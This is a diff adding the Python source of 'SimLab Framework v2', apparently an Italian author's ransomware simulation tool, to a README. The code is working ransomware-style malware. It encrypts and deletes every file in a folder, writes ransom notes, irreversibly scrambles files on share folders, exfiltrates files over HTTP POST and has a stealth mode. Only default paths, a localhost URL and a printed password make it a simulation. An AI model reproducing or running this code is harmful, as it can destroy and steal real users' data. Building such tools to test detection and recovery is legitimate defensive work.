@@ -119,5 +119,248 @@ simlab_framework.py
 - **Valutazione della resilienza di backup e piani di disaster recovery.**
 - **Verifica di strumenti di Network Monitoring e DLP.**
 
+## ** Source Code**
+```python
+import os
+import sys
+import time
+import random
+import shutil
+import hashlib
+import string
+import requests
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+# === CONFIGURAZIONE GLOBALE ===
+TARGET_FOLDER = "./test_folder"
+SHARE_PATHS = ["./lab_share1", "./lab_share2"]
+EXFILTRATED_FOLDER = "./exfiltrated_data"
+SERVER_URL = "http://127.0.0.1:5000/upload"
+PASSWORD = "SuperSecureLabPassword!"
+KEY = hashlib.sha256(PASSWORD.encode()).digest()
+ENCRYPTED_EXTENSION = ".enc"
+RANSOM_NOTE_NAME = "READ_ME_RESTORE.txt"
+
+STEALTH_MODE = False  # Set True per nessun output console
+
+
+# === BANNER INIZIALE ===
+def print_banner():
+    banner = """
+    ███████╗██╗███╗   ███╗██╗      █████╗ ██████╗ 
+    ██╔════╝██║████╗ ████║██║     ██╔══██╗██╔══██╗
+    █████╗  ██║██╔████╔██║██║     ███████║██║  ██║
+    ██╔══╝  ██║██║╚██╔╝██║██║     ██╔══██║██║  ██║
+    ██║     ██║██║ ╚═╝ ██║███████╗██║  ██║██████╔╝
+    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
+
+            SimLab Framework v2 - POLYMORPHIC Edition - Mario Protopapa
+    """
+    print(banner)
+
+
+# === UTILITIES COMUNI ===
+
+def stealth_print(message):
+    if not STEALTH_MODE:
+        print(message)
+
+
+def pad(data):
+    length = 16 - (len(data) % 16)
+    return data + bytes([length]) * length
+
+
+def unpad(data):
+    return data[:-data[-1]]
+
+
+def create_ransom_note_polymorphic(folder):
+    ransom_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    messages = [
+        "All your files have been encrypted. Good luck.",
+        "Oops! Files encrypted. Recovery possible.",
+        "Critical error: your files are now encrypted."
+    ]
+    note = f"""
+    === SIMULATED RANSOMWARE NOTICE ===
+
+    {random.choice(messages)}
+
+    Your ID: {ransom_id}
+
+    Password to recover: {PASSWORD}
+
+    (This is a simulated lab exercise)
+    """
+    path = os.path.join(folder, RANSOM_NOTE_NAME)
+    with open(path, 'w') as f:
+        f.write(note.strip())
+    stealth_print(f"[+] Ransom note created at {path}")
+
+
+# === MODULI ===
+
+def encrypt_file(filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        iv = get_random_bytes(16)
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        encrypted = cipher.encrypt(pad(data))
+        noise = get_random_bytes(random.randint(10, 100))
+        final_content = iv + encrypted + noise
+        with open(filepath + ENCRYPTED_EXTENSION, 'wb') as f:
+            f.write(final_content)
+        os.remove(filepath)
+        stealth_print(f"[+] Encrypted with noise {filepath}")
+    except Exception as e:
+        stealth_print(f"[-] Encryption failed: {e}")
+
+
+def decrypt_file(filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            iv = f.read(16)
+            encrypted = f.read()
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(encrypted[:-(len(encrypted) % 16)]))
+        original = filepath.replace(ENCRYPTED_EXTENSION, "")
+        with open(original, 'wb') as f:
+            f.write(decrypted)
+        os.remove(filepath)
+        stealth_print(f"[+] Decrypted {filepath}")
+    except Exception as e:
+        stealth_print(f"[-] Decryption failed: {e}")
+
+
+def simulate_encryption():
+    stealth_print("[*] Encrypting files polymorphically...")
+    files = []
+    for root, dirs, filelist in os.walk(TARGET_FOLDER):
+        for file in filelist:
+            if not file.endswith(ENCRYPTED_EXTENSION) and not file == RANSOM_NOTE_NAME:
+                files.append(os.path.join(root, file))
+    random.shuffle(files)
+    for f in files:
+        encrypt_file(f)
+    create_ransom_note_polymorphic(TARGET_FOLDER)
+    stealth_print("[*] Encryption complete.")
+
+
+def simulate_decryption():
+    stealth_print("[*] Decrypting files...")
+    for root, dirs, filelist in os.walk(TARGET_FOLDER):
+        for file in filelist:
+            if file.endswith(ENCRYPTED_EXTENSION):
+                decrypt_file(os.path.join(root, file))
+    stealth_print("[*] Decryption complete.")
+
+
+def scramble_data(data):
+    scrambled = bytearray(data)
+    random.shuffle(scrambled)
+    return bytes(scrambled)
+
+
+def propagate_encryption():
+    stealth_print("[*] Propagating to shares...")
+    for share in SHARE_PATHS:
+        if os.path.exists(share):
+            for root, dirs, filelist in os.walk(share):
+                for file in filelist:
+                    if not file.endswith(ENCRYPTED_EXTENSION):
+                        try:
+                            with open(os.path.join(root, file), 'rb') as f:
+                                data = f.read()
+                            scrambled = scramble_data(data)
+                            with open(os.path.join(root, file) + ENCRYPTED_EXTENSION, 'wb') as f:
+                                f.write(scrambled)
+                            os.remove(os.path.join(root, file))
+                            stealth_print(f"[+] Propagated {file}")
+                        except Exception as e:
+                            stealth_print(f"[-] Propagation failed: {e}")
+            create_ransom_note_polymorphic(share)
+    stealth_print("[*] Propagation finished.")
+
+
+def exfiltrate_file_local(filepath):
+    if not os.path.exists(EXFILTRATED_FOLDER):
+        os.makedirs(EXFILTRATED_FOLDER)
+    shutil.copy(filepath, EXFILTRATED_FOLDER)
+    stealth_print(f"[+] Locally exfiltrated {filepath}")
+
+
+def exfiltrate_file_http(filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            files = {'file': (os.path.basename(filepath), f)}
+            response = requests.post(SERVER_URL, files=files)
+            if response.status_code == 200:
+                stealth_print(f"[+] Exfiltrated via HTTP {filepath}")
+            else:
+                stealth_print(f"[-] HTTP exfiltration failed {filepath}")
+    except Exception as e:
+        stealth_print(f"[-] HTTP exfiltration error: {e}")
+
+
+def simulate_exfiltration(mode="local"):
+    stealth_print(f"[*] Exfiltrating files ({mode})...")
+    for root, dirs, filelist in os.walk(TARGET_FOLDER):
+        for file in filelist:
+            if not file.endswith(ENCRYPTED_EXTENSION) and not file == RANSOM_NOTE_NAME:
+                filepath = os.path.join(root, file)
+                if mode == "local":
+                    exfiltrate_file_local(filepath)
+                elif mode == "http":
+                    exfiltrate_file_http(filepath)
+    stealth_print("[*] Exfiltration finished.")
+
+
+# === MENU ===
+
+def main_menu():
+    global STEALTH_MODE
+    print_banner()
+    while True:
+        print("""
+        === Main Menu ===
+
+        1. Encrypt Files (Polymorphic AES)
+        2. Propagate to Network Shares
+        3. Exfiltrate Files (Local Copy)
+        4. Exfiltrate Files (HTTP POST)
+        5. Decrypt Files
+        6. Toggle Stealth Mode (Current: {})
+        7. Exit
+        """.format("ON" if STEALTH_MODE else "OFF"))
+
+        choice = input("Select an option: ").strip()
+
+        if choice == "1":
+            simulate_encryption()
+        elif choice == "2":
+            propagate_encryption()
+        elif choice == "3":
+            simulate_exfiltration(mode="local")
+        elif choice == "4":
+            simulate_exfiltration(mode="http")
+        elif choice == "5":
+            simulate_decryption()
+        elif choice == "6":
+            STEALTH_MODE = not STEALTH_MODE
+            stealth_print(f"[!] Stealth Mode is now {'ON' if STEALTH_MODE else 'OFF'}")
+        elif choice == "7":
+            stealth_print("Exiting SimLab Framework v2. Goodbye!")
+            sys.exit(0)
+        else:
+            print("Invalid choice. Please try again.")
+
+
+if __name__ == "__main__":
+    main_menu()
+```
 Ho progettato e realizzato **SimLab Framework v2** come strumento avanzato di simulazione ransomware, pensato per riflettere metodologie reali in modo sicuro e controllato.  
 L’integrazione di tecniche polimorfiche e stealth garantisce che i test di detection e risposta siano estremamente vicini agli scenari reali moderni.
+
